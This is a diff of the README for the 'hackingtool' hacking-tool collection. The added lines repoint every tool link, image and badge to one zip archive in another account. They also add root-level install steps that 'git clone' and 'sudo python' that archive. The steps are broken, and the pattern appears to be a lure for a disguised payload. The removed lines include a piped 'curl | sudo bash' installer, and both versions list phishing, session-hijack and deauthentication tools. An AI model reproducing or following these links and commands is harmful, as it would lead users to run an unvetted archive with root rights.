+- [Application Checker](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+#### Android Hacking tools
+- [Keydroid](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [MySMS](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Lockphish (Grab target LOCK PIN)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [DroidCam (Capture Image)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [EvilApp (Hijack Session)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [HatCloud(Bypass CloudFlare for IP)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
 #### IDN Homograph Attack
-- [EvilURL](https://github.com/UndeadSec/EvilURL)
-
-#### Email Verify Tools
-- [Knockmail](https://github.com/4w4k3/KnockMail)
-
-#### Hash Cracking Tools
-- [Hash Buster](https://github.com/s0md3v/Hash-Buster)
-
+- [EvilURL](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+#### Email Verify tools
+- [Knockmail](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+#### Hash cracking tools
+- [Hash Buster](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
 #### Wifi Deauthenticate
-- [WifiJammer-NG](https://github.com/MisterBianco/wifijammer-ng)
-- [KawaiiDeauther](https://github.com/aryanrtm/KawaiiDeauther)
-
+- [WifiJammer-NG](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [KawaiiDeauther](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
 #### SocialMedia Finder
-- [Find SocialMedia By Facial Recognition](https://github.com/Greenwolf/social_mapper)
-- [Find SocialMedia By UserName](https://github.com/xHak9x/finduser)
-- [Sherlock](https://github.com/sherlock-project/sherlock)
-- [SocialScan](https://github.com/iojw/socialscan)
-
+- [Find SocialMedia By Facial Recognation System](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Find SocialMedia By UserName](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Sherlock](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [SocialScan | Username or Email](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
 #### Payload Injector
-- [Debinject](https://github.com/UndeadSec/Debinject)
-- [Pixload](https://github.com/chinarulezzz/pixload)
-
-#### Web Crawling
-- [Gospider](https://github.com/jaeles-project/gospider)
-
-#### Mix Tools
-- Terminal Multiplexer (tilix)
-- [Crivo](https://github.com/GMDSantana/crivo)
+- [Debinject](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Pixload](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+#### Web crawling
+- [Gospider](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+#### Mix tools
+- Terminal Multiplexer
+- [Crivo](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
 
 
----
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
 
-## Contributing — Add a New Tool
+## Installation For Linux <img src="https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip" alt="linux" width="25" height="25"/></p><p align="center">
 
-<table>
-<tr>
-<td width="50%">
 
-### Open an Issue
+### !! RUN HACKINGTOOL AS ROOT !! 
 
-> **Title:** `[Tool Request] ToolName — Category`
 
-Use the [Tool Request](.github/ISSUE_TEMPLATE/tool_request.md) template.
+## Steps are given below : 
 
-Required: tool name, GitHub URL, category, OS, install command, reason.
 
-</td>
-<td width="50%">
+## Step : 1 Download hackingtool
 
-### Open a Pull Request
+    git clone https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip
 
-> **Title:** `[New Tool] ToolName — Category`
+## Step : 2 Give Permission to hackingtool
+    
+    chmod -R 755 hackingtool  
 
-Use the [PR template](.github/PULL_REQUEST_TEMPLATE.md) checklist.
+## Step : 3 Move to hackingtool directory
 
-Required: class in `tools/*.py`, TITLE, DESCRIPTION, INSTALL/RUN commands, SUPPORTED_OS, test locally.
+    cd hackingtool
 
-</td>
-</tr>
-</table>
+## Step : 4 Run hackingtool
+    
+    sudo python https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip
 
-> Issues or PRs that don't follow the title format will be closed without review.
+## Step : 5 For installing tools in directory
 
----
+    sudo hackingtool
 
-## Installation
 
-<table>
-<tr>
-<td>
+## Use image with Docker
 
-### One-liner (recommended)
+### Create Docker Image
+- Create the docker image 
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/Z4nzu/hackingtool/master/install.sh | sudo bash
+docker buitl -t vgpastor/hackingtool .
 ```
 
-Handles everything — prerequisites, clone, venv, launcher.
-
-</td>
-<td>
-
-### Manual
+### Run as container 
 
 ```bash
-git clone https://github.com/Z4nzu/hackingtool.git
-cd hackingtool
-sudo python3 install.py
+docker-compose up -d
 ```
 
-Then run: `hackingtool`
+### Interact with terminal
 
-</td>
-</tr>
-</table>
-
-
-### Docker
-
+- Get into the container 
 ```bash
-# Build
-docker build -t hackingtool .
-
-# Run (direct)
-docker run -it --rm hackingtool
-
-# Run (Compose — recommended)
-docker compose up -d
 docker exec -it hackingtool bash
-
-# Dev mode (live source mount)
-docker compose --profile dev up
-docker exec -it hackingtool-dev bash
-
-# Stop
-docker compose down        # stop container
-docker compose down -v     # also remove data volume
 ```
-
-
-
-### Requirements
-
-| Dependency | Version | Needed for |
-|---|---|---|
-| Python | 3.10+ | Core |
-| Go | 1.21+ | nuclei, ffuf, amass, httpx, katana, dalfox, gobuster, subfinder |
-| Ruby | any | haiti, evil-winrm |
-| Docker | any | Mythic, MobSF (optional) |
-
+**OUTPUT:**
 ```bash
-pip install -r requirements.txt
+Select Best Option : 
+
+              [1] Kali Linux / Parrot-Os (apt)
+              [2] Arch Linux (pacman)
+              [0] Exit 
 ```
+Enter the options and continue.
 
----
+- If need open other ports you can edit the https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip file
+- Volumes are mounted in the container to persist data and can share files between the host and the container
 
-## Star History
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=Z4nzu/hackingtool&type=Date&theme=dark" />
-  <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=Z4nzu/hackingtool&type=Date" />
-  <img alt="HackingTool Star History Chart" src="https://api.star-history.com/svg?repos=Z4nzu/hackingtool&type=Date" />
-</picture>
+#### Thanks to original Author of the tools used in hackingtool
 
----
+<img src ="https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip" />
+<h4>Please Don't Use for illegal Activity</h4>
 
-## Support
+### To do 
+- [ ] Release Tool 
+- [ ] Add Tools for CTF
+- [ ] Want to do automatic 
 
-If this project helps you, consider buying me a coffee:
+## Social Media :mailbox_with_no_mail:
+[![Twitter](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip%231DA1F2&label=follow&logo=twitter&logoColor=%231DA1F2&style=flat-square&url=https%3A%2F%https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip%2Fuser%2FFatChicken277)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+[![GitHub](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+##### Your Favourite Tool is not in hackingtool or Suggestions Please [CLICK HERE](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+![Z4nzu's github stats](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
 
-<a href="https://buymeacoffee.com/hardikzinzu" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="50"></a>
-
-## Social
-
-[![Twitter](https://img.shields.io/badge/Twitter-Follow-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/_Zinzu07)
-[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Z4nzu/)
-
-> **For authorized security testing only.**
-> Thanks to all original authors of the tools included in hackingtool.
-
-Your favourite tool is not listed? [Suggest it here](https://github.com/Z4nzu/hackingtool/issues/new?template=tool_request.md)
+#### Don't Forgot to share with Your Friends 
+### The new Update get will soon stay updated
+#### Thank you..!!
